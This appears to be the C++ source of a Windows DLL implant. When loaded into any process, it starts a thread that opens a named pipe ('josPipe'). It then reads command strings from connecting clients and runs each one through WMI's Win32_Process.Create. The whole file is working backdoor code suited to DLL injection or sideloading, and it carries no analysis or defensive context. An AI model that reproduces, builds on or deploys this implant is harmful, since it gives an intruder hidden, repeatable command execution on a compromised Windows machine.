﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。

#include<Windows.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <iostream>
#define BUFF_SIZE 1024
#pragma comment(lib, "wbemuuid.lib")
using namespace std;

/// <summary>
/// Create Pipe
/// </summary>
/// 
/// 
/// 
/// 
WCHAR ptsPipeName[] = L"\\\\.\\pipe\\josPipe";
DWORD dwThreadId = 0;

int WMICCreateProcess(PWCHAR Command)
{
    HRESULT hres;

    // Step 1: --------------------------------------------------
    // Initialize COM. ------------------------------------------

    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres))
    {
        cout << "Failed to initialize COM library. Error code = 0x"
            << hex << hres << endl;
        return 1;                  // Program has failed.
    }

    // Step 2: --------------------------------------------------
    // Set general COM security levels --------------------------

    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM negotiates service
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
    );


    if (FAILED(hres))
    {
        cout << "Failed to initialize security. Error code = 0x"
            << hex << hres << endl;
        CoUninitialize();
        return 1;                      // Program has failed.
    }

    // Step 3: ---------------------------------------------------
    // Obtain the initial locator to WMI -------------------------

    IWbemLocator* pLoc = NULL;

    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);

    if (FAILED(hres))
    {
        cout << "Failed to create IWbemLocator object. "
            << "Err code = 0x"
            << hex << hres << endl;
        CoUninitialize();
        return 1;                 // Program has failed.
    }

    // Step 4: ---------------------------------------------------
    // Connect to WMI through the IWbemLocator::ConnectServer method

    IWbemServices* pSvc = NULL;

    // Connect to the local root\cimv2 namespace
    // and obtain pointer pSvc to make IWbemServices calls.
    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),
        NULL,
        NULL,
        0,
        NULL,
        0,
        0,
        &pSvc
    );

    if (FAILED(hres))
    {
        cout << "Could not connect. Error code = 0x"
            << hex << hres << endl;
        pLoc->Release();
        CoUninitialize();
        return 1;                // Program has failed.
    }

    cout << "Connected to ROOT\\CIMV2 WMI namespace" << endl;


    // Step 5: --------------------------------------------------
    // Set security levels for the proxy ------------------------

    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx 
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx 
        NULL,                        // Server principal name 
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // client identity
        EOAC_NONE                    // proxy capabilities 
    );

    if (FAILED(hres))
    {
        cout << "Could not set proxy blanket. Error code = 0x"
            << hex << hres << endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;               // Program has failed.
    }

    // Step 6: --------------------------------------------------
    // Use the IWbemServices pointer to make requests of WMI ----

    // set up to call the Win32_Process::Create method
    BSTR MethodName = SysAllocString(L"Create");
    BSTR ClassName = SysAllocString(L"Win32_Process");

    IWbemClassObject* pClass = NULL;
    hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);

    IWbemClassObject* pInParamsDefinition = NULL;
    hres = pClass->GetMethod(MethodName, 0,
        &pInParamsDefinition, NULL);

    IWbemClassObject* pClassInstance = NULL;
    hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);

    // Create the values for the in parameters
    VARIANT varCommand;
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(Command);

    // Store the value for the in parameters
    hres = pClassInstance->Put(L"CommandLine", 0,
        &varCommand, 0);
    wprintf(L"The command is: %s\n", V_BSTR(&varCommand));

    // Execute Method
    IWbemClassObject* pOutParams = NULL;
    hres = pSvc->ExecMethod(ClassName, MethodName, 0,
        NULL, pClassInstance, &pOutParams, NULL);

    if (FAILED(hres))
    {
        cout << "Could not execute method. Error code = 0x"
            << hex << hres << endl;
        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClass->Release();
        pClassInstance->Release();
        pInParamsDefinition->Release();
        pOutParams->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;               // Program has failed.
    }

    // To see what the method returned,
    // use the following code.  The return value will
    // be in &varReturnValue
    VARIANT varReturnValue;
    hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0,
        &varReturnValue, NULL, 0);


    // Clean up
    //--------------------------
    VariantClear(&varCommand);
    VariantClear(&varReturnValue);
    SysFreeString(ClassName);
    SysFreeString(MethodName);
    pClass->Release();
    pClassInstance->Release();
    pInParamsDefinition->Release();
    pOutParams->Release();
    pLoc->Release();
    pSvc->Release();
    CoUninitialize();
    return 0;
}



wchar_t* char2wchar(const char* cchar)
{
    wchar_t* m_wchar;//定义宽字指针
    //取多字长度
    int len = MultiByteToWideChar(
        CP_ACP, //代码面
        0, //标志
        cchar, //多字字符串
        strlen(cchar),//多字字符串长度 
        NULL,//宽字字符串 
        0);//宽字字符串长度
    m_wchar = new wchar_t[len + 1];//为宽字指针分配内存
    ZeroMemory(m_wchar, len + 1);
    MultiByteToWideChar(CP_ACP, 0, cchar, strlen(cchar), m_wchar, len);//复制多字到宽字
    m_wchar[len] = '\0';//字符串结尾
    return m_wchar;//返回指针
}

DWORD HandleCode(VOID) {
    HANDLE hPipe;
    DWORD dwError;
    DWORD dwLen;
    hPipe = CreateNamedPipe(
        ptsPipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_WAIT| PIPE_TYPE_MESSAGE |PIPE_TYPE_BYTE| PIPE_READMODE_MESSAGE,
        PIPE_UNLIMITED_INSTANCES,
        BUFF_SIZE,
        BUFF_SIZE,
        0,
        NULL);
   if (hPipe == INVALID_HANDLE_VALUE) {
       dwError = GetLastError();
       wprintf(L"[-] Create Pipe Error : %d \n", dwError);
       return dwError;
   }
   wprintf(L"[+] Create Pipe Success : %s \n", ptsPipeName);
   for (;;) {
       if (ConnectNamedPipe(hPipe, NULL) > 0) {
           CHAR szBuffer[BUFF_SIZE];
           ZeroMemory(szBuffer, BUFF_SIZE);
           wprintf(L"[+] Client Connected...\n");
           ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
           wprintf(L"[+] Get Command  : %s \n", szBuffer);
           WMICCreateProcess(char2wchar(szBuffer));
           DisconnectNamedPipe(hPipe);
       }
   }
   
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HandleCode, NULL, NULL, &dwThreadId);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

